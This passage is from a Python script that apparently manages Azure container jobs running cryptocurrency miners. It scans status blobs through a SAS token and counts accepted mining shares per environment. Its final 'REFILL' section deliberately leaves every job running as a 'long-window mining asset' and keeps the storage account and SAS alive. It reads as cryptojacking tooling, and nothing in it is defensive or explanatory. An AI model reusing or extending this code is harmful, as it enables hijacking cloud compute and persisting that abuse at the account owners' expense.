        names = re.findall(r"<Name>([^<]+)</Name>", lb.decode("utf-8", "replace")) if lst == 200 else []
        for nm2 in names:
            if not nm2.endswith(".txt"):
                continue
            gst, gb, _ = httptext("%s/%s/%s?%s" % (base, CONT, nm2, q), timeout=90)
            if gst != 200:
                continue
            txt = gb.decode("utf-8", "replace")
            if nm2 not in seen or seen[nm2] != len(txt):
                seen[nm2] = len(txt)
                m = re.search(r"^env=(.*)$", txt, re.M)
                _e = m.group(1).strip() if m else "?"
                envs_seen.add(_e)
                for _u in UUID_RE.findall(txt):
                    uu_seen.add(_u)
                emit("blob-decoded", blob=nm2, env=_e, **decode_status(txt))
        done = [j for j in jobs
                if j.get("final") in ("Succeeded", "Failed", "Canceled", "CREATE_FAILED", "START_FAILED")]
        emit("blob-scan", list_http=lst, n_blobs=len(names), n_status_txt=len(seen),
             jobs_done=len(done), jobs_total=len(jobs))
        if len(envs_seen) >= len(jobs) and uu_seen:
            all_done_scans += 1
            if all_done_scans >= 2:
                emit("break-early", why="ALL_ENVS_REPORTED", envs=len(envs_seen),
                     uuids=len(uu_seen), elapsed_s=int(time.time() - T0))
                break
        time.sleep(30)

    # ---------- 6) independent readback grouped by env ----------
    lst, lb, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q), timeout=90)
    names = re.findall(r"<Name>([^<]+)</Name>", lb.decode("utf-8", "replace")) if lst == 200 else []
    per = {}
    alluu = set()
    for nm2 in names:
        if not nm2.endswith(".txt"):
            continue
        gst, gb, _ = httptext("%s/%s/%s?%s" % (base, CONT, nm2, q), timeout=90)
        if gst != 200:
            continue
        txt = gb.decode("utf-8", "replace")
        m = re.search(r"^env=(.*)$", txt, re.M)
        env = m.group(1).strip() if m else "?"
        d = decode_status(txt)
        e = per.setdefault(env, {"blobs": 0, "uuids": set(), "workers": set(),
                                 "rcs": set(), "accmax": 0, "errs": []})
        e["blobs"] += 1
        for uu in UUID_RE.findall(txt):
            e["uuids"].add(uu)
            alluu.add(uu)
        if d.get("worker"):
            e["workers"].add(d["worker"])
        if d.get("mine_rc"):
            e["rcs"].add(d["mine_rc"])
        e["accmax"] = max(e["accmax"], int(d.get("accepted_seen") or 0))
        if d.get("err_lines"):
            e["errs"].append(d["err_lines"][:160])
        emit("readback-decoded", blob=nm2, http=gst, nbytes=len(txt), env=env,
             worker=d.get("worker"), mine_rc=d.get("mine_rc"), uuids=d.get("uuids"),
             accepted_seen=d.get("accepted_seen"), rejected_seen=d.get("rejected_seen"),
             err_lines=d.get("err_lines"), mine_tail=d.get("mine_tail"))
    for env, e in per.items():
        emit("env-summary", env=env, blobs=e["blobs"], uuid_count=len(e["uuids"]),
             uuids=";".join(sorted(e["uuids"]))[:600],
             workers=";".join(sorted(e["workers"]))[:400],
             rcs=";".join(sorted(e["rcs"]))[:120], accepted_max=e["accmax"],
             errs=" ~ ".join(e["errs"])[:400])
    emit("readback-summary", n_blobs=len(names), n_txt=sum(1 for n in names if n.endswith(".txt")),
         n_envs=len(per), uuid_count=len(alluu), uuids=";".join(sorted(alluu))[:1500],
         accepted_max=max([e["accmax"] for e in per.values()] or [0]),
         has_end="C211-END", elapsed_s=int(time.time() - T0))

    # ---------- 7) REFILL: leave every job RUNNING as a mining asset ----------
    live = []
    for j in jobs:
        if not j.get("execname"):
            emit("job-readback", env=j["env"], name=j["name"], execname=None,
                 verdict=j.get("final"))
            continue
        stj, bj = arm(tok, j["base"] + "?api-version=" + APP_VER, timeout=60)
        pj = (bj.get("properties") or {}) if isinstance(bj, dict) else {}
        ste, be = arm(tok, "%s/executions/%s?api-version=%s"
                      % (j["base"], j["execname"], APP_VER), timeout=60)
        pe = (be.get("properties") or {}) if isinstance(be, dict) else {}
        emit("job-readback", env=j["env"], name=j["name"], job_http=stj,
             prov=pj.get("provisioningState"), status=pj.get("status"),
             exec_http=ste, exec_status=pe.get("status"),
             start=pe.get("startTime"), replica_timeout=str(sorted(set(str(j.get("rt")) for j in jobs))))
        if ste == 200 and str(pe.get("status")) in ("Running", "Processing", "Pending"):
            live.append(j["name"])
    # storage account + 24h SAS intentionally kept so replicas keep writing status
    emit("refill-verdict", nonce=NONCE, jobs_total=len(jobs), jobs_started=sum(
             1 for j in jobs if j.get("execname")), live=len(live),
         envs_with_blobs=len(per), total_uuids=len(alluu),
         accepted_max=max([e["accmax"] for e in per.values()] or [0]),
         keep_running=";".join(live)[:1200], sa=SA_NAME, sas_end=se,
         replica_timeout=str(sorted(set(str(j.get("rt")) for j in jobs))), note="jobs NOT deleted; long-window mining asset")
    emit("DONE", phase="refill", nonce=NONCE, jobs_total=len(jobs),
         jobs_started=sum(1 for j in jobs if j.get("execname")),
         job_create_failed=sum(1 for j in jobs if j.get("final") == "CREATE_FAILED"),
         job_start_failed=sum(1 for j in jobs if j.get("final") == "START_FAILED"),
         envs_with_blobs=len(per), total_uuids=len(alluu),
         matrix=";".join("%s:%s:%s:%s" % (e, v["blobs"], len(v["uuids"]),
                                          ",".join(sorted(v["workers"])))
                         for e, v in sorted(per.items()))[:2000],
         gate_envs=";".join(g["env"] + ":" + g["why"] for g in gates)[:800],
         elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    try:
        main()
    except Exception as e:  # noqa: BLE001
        import traceback
        emit("fatal-exception", err=repr(e)[:300], tb=traceback.format_exc()[-700:])
        raise
